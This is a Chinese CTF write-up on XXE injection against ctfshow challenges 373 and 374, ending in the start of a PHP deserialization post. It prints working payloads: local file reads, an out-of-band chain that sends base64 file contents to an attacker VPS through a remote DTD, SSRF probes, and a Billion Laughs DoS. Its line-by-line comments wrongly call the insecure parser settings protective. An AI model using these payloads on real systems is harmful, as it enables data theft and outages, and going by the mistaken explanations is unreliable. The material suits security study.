<p>实体根据引用方式，还可分为内部实体与外部实体</p>
<h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<p>DTD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注释：别忘记一个通用实体由三部分构成：一个和号 ( <code>&amp;</code> )，一个<code>实体名称</code>， 以及一个分号 ( <code>;</code> )</p>
<h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体:"></a>外部实体:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>URL中能写哪些类型的外部实体呢？如图所示：</p>
<p><img src="https://s2.loli.net/2023/12/20/WiJR52dgfnx9Dpb.png" alt="image-20231008193523097"></p>
<p>实列：</p>
<p>DTD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然，还有一种引用方式是使用 引用 <strong>公用 DTD</strong> 的方法，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这个在我们的攻击中也可以起到和 <code>SYSTEM</code> 一样的作用</p>
<h4 id="XML外部实体注入："><a href="#XML外部实体注入：" class="headerlink" title="XML外部实体注入："></a>XML外部实体注入：</h4><p>XML External Entity Injection 即 xml 外部实体注入漏洞，简称XXE漏洞。XXE是针对解析XML输入的应用程序的一种攻击。 当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。 这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。</p>
<h5 id="有回显读敏感文件"><a href="#有回显读敏感文件" class="headerlink" title="有回显读敏感文件"></a>有回显读敏感文件</h5><p>本题为 ctfshow web 373 题的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>以下是代码的简要解释：</p>
<ol>
<li><code>error_reporting(0);</code> - 禁用错误报告，这意味着将不会显示任何错误信息。</li>
<li><code>libxml_disable_entity_loader(false);</code> - 启用XML实体加载器，这是为了防止XML外部实体注入攻击。</li>
<li><code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code> - 从输入中获取XML文件的内容。</li>
<li><code>if(isset($xmlfile))&#123;...&#125;</code> - 检查是否成功获取XML文件内容。</li>
<li><code>$dom = new DOMDocument();</code> - 创建一个新的DOMDocument对象，用于处理XML文档。</li>
<li><code>$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</code> - 加载XML文件内容到DOMDocument对象中，并禁用实体和DTD加载，以防止实体注入攻击。</li>
<li><code>$creds = simplexml_import_dom($dom);</code> - 将DOMDocument对象转换为SimpleXMLElement对象，以便于访问XML数据。</li>
<li><code>$ctfshow = $creds-&gt;ctfshow;</code> - 从XML数据中提取ctfshow元素的值。</li>
<li><code>echo $ctfshow;</code> - 将ctfshow元素的值输出到页面上。</li>
<li><code>highlight_file(__FILE__);</code> - 在页面上高亮显示当前PHP文件的源代码。</li>
</ol>
<p>贴个payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Ed3n [</span><br><span class="line">&lt;!ELEMENT Ed3n ANY&gt;</span><br><span class="line">	&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Ed3n&gt;</span><br><span class="line">	&lt;ctfshow&gt;&amp;payload;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/Ed3n&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/11/YxXB7c3PtpydFEr.png" alt="image-20240311181553404"></p>
<p>但我看到了 K0rz3n 佬读取复杂文件名的操作，感觉分别可以应用在读取Linux和Windows的flag上。</p>
<p>以下为主要内容摘要：</p>
<blockquote>
<blockquote>
<p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <code>&lt; &gt; &amp; &quot;</code>  字符，CDATA 元素中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>

<p>可以输入任意字符除了 <code>]]&gt;</code> 不能嵌套<br>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA 包起来</p>
</blockquote>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p>
<p>首先，找到问题出现的地方，问题出现在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;...</span><br><span class="line">&gt;&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>引用并不接受可能会引起 xml 格式混乱的字符（在XML中，有时实体内包含了些字符，如<code>&amp;,&lt;,&gt;,&quot;,&#39;</code>等。这些均需要对其进行转义，否则会对XML解释器生成错误），我们想在引用的两边加上 <code>&quot;&lt;![CDATA[&quot;和 “]]&gt;”</code> ，但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt;&lt;!DOCTYPE roottag [</span><br><span class="line">  &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&gt;]&gt;</span><br><span class="line">&gt;&lt;roottag&gt;&amp;start;&amp;goodies;&amp;end;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>

<p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在xml 中调用，那么要想在 DTD 中拼接，我们知道我们只有一种选择，就是使用参数实体</p>
</blockquote>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>

<p><strong>evil.dtd</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code>：指定XML版本为1.0，字符编码为UTF-8。</p>
<p><code>&lt;!DOCTYPE roottag [...]&gt;</code>：定义了名为”roottag”的根元素，并在内部包含了一组实体定义。</p>
<p><code>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</code>：定义了名为”start”的参数实体，内容为”&lt;![CDATA[“，用于表示CDATA块的起始部分。</p>
<p><code>&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code>：定义了名为”goodies”的参数实体，指向本地文件”d:&#x2F;test.txt”，用于引入外部实体内容。</p>
<p> <code>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</code>：定义了名为”end”的参数实体，内容为”]]&gt;”,用于表示CDATA块的结束部分。</p>
<p> <code>&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</code>：定义了名为”dtd”的参数实体，指向远程DTD文件”<code>http://ip/evil.dtd</code>“。<br> <code>%dtd;</code>：在DOCTYPE声明中引用了”dtd”参数实体，将远程DTD文件的内容插入到文档中。</p>
<p> <code>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code>：XML文档的根元素为”roottag”，其中引用了名为”all”的通用实体，从而达到拼接的目的。</p>
<p>第二个XML代码片段中的<code>evil.dtd</code>文件定义了一个名为<code>all</code>的通用实体，其内容为<code>%start;%goodies;%end;</code>，表示<code>all</code>实体由<code>start</code>、<code>goodies</code>和<code>end</code>三个实体组成。</p>
<h5 id="无回显读敏感文件："><a href="#无回显读敏感文件：" class="headerlink" title="无回显读敏感文件："></a>无回显读敏感文件：</h5><p>本题为 ctfshow web 374 题的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>相比较于上一道有回显的题目，差别在于删除了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br></pre></td></tr></table></figure>

<p>我们的做法是将flag外带</p>
<p><del>由于新人第一次接触反弹Shell的做法，就将接下来的步骤写的详细一些了</del></p>
<p>如果是腾讯云的vps，要现在防火墙将所有端口开放</p>
<p><img src="https://s2.loli.net/2024/03/13/t3vQkyRPYEoSFOI.png" alt="image-20240313173756361"></p>
<p>启动vps后在特定宽口开放http服务，以便通过外网能访问到你的恶意文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure>

<p>此时我们访问一下 <a href="http://vps-ip:8000/">http://vps-ip:8000</a> 试试看：（未有特殊说明则默认开放8000端口，ip为vps公网的ip）</p>
<p><img src="https://s2.loli.net/2024/03/13/q4QxSDGbpXnMOEv.png" alt="image-20240313153456749"></p>
<p>此时</p>
<p><img src="https://s2.loli.net/2024/03/13/AyUs89x3OrngBFe.png" alt="image-20240313154259477"></p>
<p>说明8000端口启动http服务成功</p>
<p>同理我们来测试1234端口：</p>
<p><img src="https://s2.loli.net/2024/03/13/A6UcgXZFuofS2Bv.png" alt="image-20240313154326926"></p>
<p>说明1234端口也启动http服务成功</p>
<p>创建XXE.dtd文件并写入如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim XXE.dtd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#XXE.dtd</span><br><span class="line">#shift+i</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">#esc</span><br><span class="line">#shift+: 输入wq保存退出</span><br></pre></td></tr></table></figure>

<p>在另一个页面监听本地1234端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/13/czXb29IgDC4wZFL.png" alt="image-20240313154810747"></p>
<p>burp发包内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 2299db75-d9fe-416f-959d-406b131ae701.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/13/G4Q5JhVHnozk1M6.png" alt="image-20240313161738958"></p>
<p>在监听的页面就可以看到加密后的flag</p>
<p><img src="https://s2.loli.net/2024/03/13/R24VpE8F6yLnZdC.png" alt="image-20240313155739020"></p>
<p>解密后得到flag</p>
<p><img src="https://s2.loli.net/2024/03/13/VBZqvXIb3kepYiA.png" alt="image-20240313155848778"></p>
<p>对payload的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>定义了两个实体：</p>
<ol>
<li><p><code>%file</code>：它使用php过滤器读取系统文件<code>/flag</code>的内容，并对内容进行base64编码。</p>
</li>
<li><p><code>%dtd</code>：它从远程URL <code>http://vps-ip:8000/XXE.dtd</code>加载DTD文件。</p>
</li>
</ol>
<p>以下是jay17师傅的解释（实体名有所改动）：</p>
<ol>
<li>不能直接<code>&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/%file&quot;&gt; </code>，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制</li>
<li><code>%dtd;</code>会读取远程dtd文件，读到了以后，因为远程dtd文件有一个<code>% all</code>实体的定义，那么就会解析这个实体定义。<code>% all</code>实体的定义内容是另外一个实体<code>% send</code>定义，那就会解析<code>% send</code>，就会执行远程请求，请求地址<code>http://vps-ip:8000/%file</code>，会在我们的 vps 日志上留下痕迹。<br>也可以起 nc 监听端口，能判断是否有向我们的 vps 发送请求以及请求内容。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>&amp;#x25;</code> 就是百分号，因为是嵌套在里面的引用，不能直接写百分号</li>
<li><code>%all</code>实体定义了一个新的实体<code>send</code>，其内容是一个SYSTEM类型的实体，用于发送数据到指定的URL。在这里，<code>%file</code>实体被引用在URL中，以便将<code>/flag</code>文件的内容发送到指定的<code>http://vps-ip:1234/</code>地址。</li>
<li>在XML文档的解析过程中，通过引用<code>%all</code>实体，实际上定义了一个名为<code>send</code>的实体，其值是将<code>/flag</code>文件内容发送到指定URL的操作。</li>
<li>最后，通过引用<code>%send</code>实体，实际上执行了之前定义的<code>send</code>实体，将<code>/flag</code>文件的内容发送到指定的URL。</li>
</ol>
<h3 id="XXE检测："><a href="#XXE检测：" class="headerlink" title="XXE检测："></a>XXE检测：</h3><p>主要的方法是检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容。</p>
<p>首先检测XML是否会被成功解析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/12/20/zScwHxmoaDt2hqJ.png" alt="image-20231008194425489"></p>
<p>如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。</p>
<p><img src="https://s2.loli.net/2023/12/20/WV5Z1hPgBNuRQU3.png" alt="image-20231008194500250"></p>
<p>接下来检测该端点是否支持DTD引用外部实体：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;http://localhost/tp5/test.xml&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>此时通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的HTTP request。</p>
<p><img src="https://s2.loli.net/2023/12/20/OxmH3Qjp9ahRWPK.png" alt="image-20231008210523538"></p>
<p>如图所示，则该处很可能存在XML外部实体注入漏洞。</p>
<h3 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h3><p>XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
<p>当然也可以用来探测端口信息，根据响应包的信息，若非“connection refused”则表示该端口可能是开放的。</p>
<p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。关于ncat的使用：ncat-网络工具中的“瑞士军刀”</p>
<p>用ncat在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)</p>
<p>之后便可使用以下语句尝试是否能够建立连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:8081/&quot; [</span><br><span class="line">    &lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DDoS："><a href="#DDoS：" class="headerlink" title="DDoS："></a>DDoS：</h3><p>支持实体测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
<p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p>
<h3 id="Billion-Laughs-攻击："><a href="#Billion-Laughs-攻击：" class="headerlink" title="Billion Laughs 攻击："></a>Billion Laughs 攻击：</h3><p>一个经典的Dos攻击payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">        ...... </span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
<p>当XML解析器加载该文档时，它会看到它包含一个根元素 “lolz” ，该元素包含文本 “&lol9;” 。然而，“&lol9;” 是一个已定义的实体，它扩展为包含十个 “&lol8;” 字符串。每个 “&lol8;” 字符串都是一个已定义的实体，可以扩展到10个 “&lol7;” 字符串，以此类推。在处理完所有的实体扩展之后，这个小（小于1 KB）的XML块实际上将包含 109 &#x3D; 10亿个 “lol” ，占用了将近 3 gb 的内存。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTD 简介 (w3school.com.cn)</a></p>
<p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUhG+KG=DceorD3D&alichlgref=https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/389550468">XXE知识总结，有这篇就够了！ - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/Jayjay___/article/details/132146130">Ctfshow web入门 XXE 模板注入篇 web373-web378 详细题解 全_ctfshow web373-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/uuzeray/article/details/134641792">【Web】CTFSHOW XXE刷题记录(全)-CSDN博客</a></p>
]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>XXE</tag>
        <tag>reverse shell</tag>
      </tags>
  </entry>
  <entry>
    <title>php 反序列化学习记录</title>
    <url>/2024/03/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="前置代码条件："><a href="#前置代码条件：" class="headerlink" title="前置代码条件："></a>前置代码条件：</h2><h3 id="this"><a href="#this" class="headerlink" title="$this-&gt;"></a>$this-&gt;</h3><p><code>$this</code>在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，<code>$this</code>中并没有，哪个对象调用，<code>$this</code>就代表哪个对象， 也可以将<code>$this</code>理解为对象的引用，通过引用的方式访问一个对象的方法和属性。</p>
<p><code>&lt;?php echo $this-&gt;tpl_id?&gt;</code>中(<code>$this-&gt;</code>表示实例化后调用具体对象)</p>
<span id="more"></span>

<p><strong>实列</strong></p>
